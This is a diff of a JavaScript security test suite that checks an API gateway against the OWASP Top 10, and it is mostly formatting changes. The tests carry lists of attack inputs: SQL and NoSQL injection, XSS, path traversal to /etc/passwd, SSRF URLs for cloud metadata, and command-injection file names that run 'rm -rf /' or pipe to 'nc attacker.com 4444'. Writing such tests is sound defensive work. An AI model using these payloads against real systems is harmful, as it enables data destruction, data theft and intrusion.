@@ -1,8 +1,7 @@
 import request from 'supertest';
-import TestHelpers from '../utils/test-helpers.js';
-
 // Mock the API Gateway for security testing
 import app from '@/services/api-gateway/app.js';
+import TestHelpers from '../utils/test-helpers.js';
 
 describe('OWASP Top 10 Security Tests', () => {
   let server;
@@ -14,7 +13,7 @@ describe('OWASP Top 10 Security Tests', () => {
   });
 
   afterAll(async () => {
-    await new Promise(resolve => server.close(resolve));
+    await new Promise((resolve) => server.close(resolve));
   });
 
   describe('A01: Broken Access Control', () => {
@@ -39,7 +38,7 @@ describe('OWASP Top 10 Security Tests', () => {
 
     it('should prevent path traversal attacks', async () => {
       const maliciousPath = '../../../etc/passwd';
-      
+
       const response = await request(server)
         .get(`/api/v1/files/${encodeURIComponent(maliciousPath)}`)
         .set('Authorization', authToken)
@@ -55,7 +54,7 @@ describe('OWASP Top 10 Security Tests', () => {
         'project_-1',
         'project_null',
         'project_undefined',
-        'project_../../admin'
+        'project_../../admin',
       ];
 
       for (const id of manipulatedIds) {
@@ -85,7 +84,7 @@ describe('OWASP Top 10 Security Tests', () => {
         .post('/api/v1/auth/register')
         .send({
           email: 'test@example.com',
-          password: 'SecurePassword123!'
+          password: 'SecurePassword123!',
         })
         .expect(201);
 
@@ -111,7 +110,7 @@ describe('OWASP Top 10 Security Tests', () => {
         "'; DROP TABLE users; --",
         "1' OR '1'='1",
         "admin'--",
-        "1; SELECT * FROM users WHERE 't' = 't"
+        "1; SELECT * FROM users WHERE 't' = 't",
       ];
 
       for (const payload of sqlInjectionPayloads) {
@@ -130,7 +129,7 @@ describe('OWASP Top 10 Security Tests', () => {
       const noSqlPayloads = [
         { $ne: null },
         { $gt: '' },
-        { $where: 'this.password == this.password' }
+        { $where: 'this.password === this.password' },
       ];
 
       for (const payload of noSqlPayloads) {
@@ -148,7 +147,7 @@ describe('OWASP Top 10 Security Tests', () => {
       const commandInjectionPayloads = [
         'test.png; rm -rf /',
         'test.png && cat /etc/passwd',
-        'test.png | nc attacker.com 4444'
+        'test.png | nc attacker.com 4444',
       ];
 
       for (const payload of commandInjectionPayloads) {
@@ -167,7 +166,7 @@ describe('OWASP Top 10 Security Tests', () => {
         '<script>alert("XSS")</script>',
         '<img src=x onerror=alert(1)>',
         'javascript:alert(1)',
-        '<svg/onload=alert(1)>'
+        '<svg/onload=alert(1)>',
       ];
 
       for (const payload of xssPayloads) {
@@ -176,7 +175,7 @@ describe('OWASP Top 10 Security Tests', () => {
           .set('Authorization', authToken)
           .send({
             name: payload,
-            description: payload
+            description: payload,
           })
           .expect(201);
 
@@ -204,27 +203,23 @@ describe('OWASP Top 10 Security Tests', () => {
       }
 
       const responses = await Promise.all(promises);
-      const failures = responses.filter(r => r.status === 400);
-      
+      const failures = responses.filter((r) => r.status === 400);
+
       expect(failures.length).toBeGreaterThan(0);
       expect(failures[0].body.error.code).toBe('PROJECT_LIMIT_EXCEEDED');
     });
 
     it('should implement proper rate limiting', async () => {
       const requests = [];
-      
+
       // Send many requests quickly
       for (let i = 0; i < 150; i++) {
-        requests.push(
-          request(server)
-            .get('/api/v1/user/profile')
-            .set('Authorization', authToken)
-        );
+        requests.push(request(server).get('/api/v1/user/profile').set('Authorization', authToken));
       }
 
       const responses = await Promise.all(requests);
-      const rateLimited = responses.filter(r => r.status === 429);
-      
+      const rateLimited = responses.filter((r) => r.status === 429);
+
       expect(rateLimited.length).toBeGreaterThan(0);
     });
 
@@ -235,7 +230,7 @@ describe('OWASP Top 10 Security Tests', () => {
         .set('Authorization', authToken)
         .send({
           analysisId: 'nonexistent_analysis',
-          framework: 'react'
+          framework: 'react',
         })
         .expect(400);
 
@@ -245,13 +240,11 @@ describe('OWASP Top 10 Security Tests', () => {
 
   describe('A05: Security Misconfiguration', () => {
     it('should not expose sensitive headers', async () => {
-      const response = await request(server)
-        .get('/health')
-        .expect(200);
+      const response = await request(server).get('/health').expect(200);
 
       // Check that sensitive headers are not exposed
       expect(response.headers['x-powered-by']).toBeUndefined();
-      expect(response.headers['server']).toBeUndefined();
+      expect(response.headers.server).toBeUndefined();
       expect(response.headers['x-aspnet-version']).toBeUndefined();
     });
 
@@ -284,13 +277,13 @@ describe('OWASP Top 10 Security Tests', () => {
         .post('/api/v1/auth/login')
         .send({
           email: 'test@example.com',
-          password: 'password123'
+          password: 'password123',
         })
         .expect(200);
 
       const cookies = response.headers['set-cookie'];
       if (cookies) {
-        cookies.forEach(cookie => {
+        cookies.forEach((cookie) => {
           expect(cookie).toContain('Secure');
           expect(cookie).toContain('HttpOnly');
           expect(cookie).toContain('SameSite=Strict');
@@ -313,20 +306,14 @@ describe('OWASP Top 10 Security Tests', () => {
 
   describe('A07: Identification and Authentication Failures', () => {
     it('should enforce strong password requirements', async () => {
-      const weakPasswords = [
-        '123456',
-        'password',
-        'qwerty',
-        'abc123',
-        'password123'
-      ];
+      const weakPasswords = ['123456', 'password', 'qwerty', 'abc123', 'password123'];
 
       for (const password of weakPasswords) {
         const response = await request(server)
           .post('/api/v1/auth/register')
           .send({
             email: `test${Date.now()}@example.com`,
-            password
+            password,
           })
           .expect(400);
 
@@ -341,18 +328,16 @@ describe('OWASP Top 10 Security Tests', () => {
       // Make multiple failed login attempts
       for (let i = 0; i < 6; i++) {
         attempts.push(
-          request(server)
-            .post('/api/v1/auth/login')
-            .send({
-              email,
-              password: 'wrong-password'
-            })
+          request(server).post('/api/v1/auth/login').send({
+            email,
+            password: 'wrong-password',
+          })
         );
       }
 
       const responses = await Promise.all(attempts);
       const lastResponse = responses[responses.length - 1];
-      
+
       expect(lastResponse.status).toBe(429);
       expect(lastResponse.body.error.code).toBe('ACCOUNT_LOCKED');
     });
@@ -363,7 +348,7 @@ describe('OWASP Top 10 Security Tests', () => {
         .post('/api/v1/auth/login')
         .send({
           email: 'test@example.com',
-          password: 'password123'
+          password: 'password123',
         })
         .expect(200);
 
@@ -399,7 +384,7 @@ describe('OWASP Top 10 Security Tests', () => {
     it('should validate webhook signatures', async () => {
       const webhookPayload = {
         event: 'analysis.completed',
-        data: { analysisId: '123' }
+        data: { analysisId: '123' },
       };
 
       // Send webhook without signature
@@ -419,7 +404,7 @@ describe('OWASP Top 10 Security Tests', () => {
         .post('/api/v1/auth/login')
         .send({
           email: 'nonexistent@example.com',
-          password: 'wrong-password'
+          password: 'wrong-password',
         })
         .expect(401);
 
@@ -468,7 +453,7 @@ describe('OWASP Top 10 Security Tests', () => {
         'http://127.0.0.1:22',
         'http://169.254.169.254/latest/meta-data/',
         'file:///etc/passwd',
-        'gopher://localhost:3306'
+        'gopher://localhost:3306',
       ];
 
       for (const payload of ssrfPayloads) {
@@ -486,7 +471,7 @@ describe('OWASP Top 10 Security Tests', () => {
       const internalUrls = [
         'http://localhost/webhook',
         'http://10.0.0.1/webhook',
-        'http://192.168.1.1/webhook'
+        'http://192.168.1.1/webhook',
       ];
 
       for (const url of internalUrls) {
@@ -505,7 +490,7 @@ describe('OWASP Top 10 Security Tests', () => {
     it('should implement proper input validation', async () => {
       const oversizedPayload = {
         name: 'a'.repeat(10000),
-        description: 'b'.repeat(100000)
+        description: 'b'.repeat(100000),
       };
 
       const response = await request(server)
@@ -523,37 +508,33 @@ describe('OWASP Top 10 Security Tests', () => {
       // Test with valid and invalid users
       const users = [
         { email: 'valid@example.com', exists: true },
-        { email: 'invalid@example.com', exists: false }
+        { email: 'invalid@example.com', exists: false },
       ];
 
       for (const user of users) {
         const start = process.hrtime.bigint();
-        
-        await request(server)
-          .post('/api/v1/auth/login')
-          .send({
-            email: user.email,
-            password: 'wrong-password'
-          });
-          
+
+        await request(server).post('/api/v1/auth/login').send({
+          email: user.email,
+          password: 'wrong-password',
+        });
+
         const end = process.hrtime.bigint();
         const duration = Number(end - start) / 1e6; // Convert to ms
-        
+
         timings.push({ exists: user.exists, duration });
       }
 
       // Response times should be similar to prevent user enumeration
-      const validTiming = timings.find(t => t.exists).duration;
-      const invalidTiming = timings.find(t => !t.exists).duration;
+      const validTiming = timings.find((t) => t.exists).duration;
+      const invalidTiming = timings.find((t) => !t.exists).duration;
       const difference = Math.abs(validTiming - invalidTiming);
-      
+
       expect(difference).toBeLessThan(50); // Less than 50ms difference
     });
 
     it('should implement Content Security Policy', async () => {
-      const response = await request(server)
-        .get('/')
-        .expect(200);
+      const response = await request(server).get('/').expect(200);
 
       const csp = response.headers['content-security-policy'];
       expect(csp).toBeDefined();
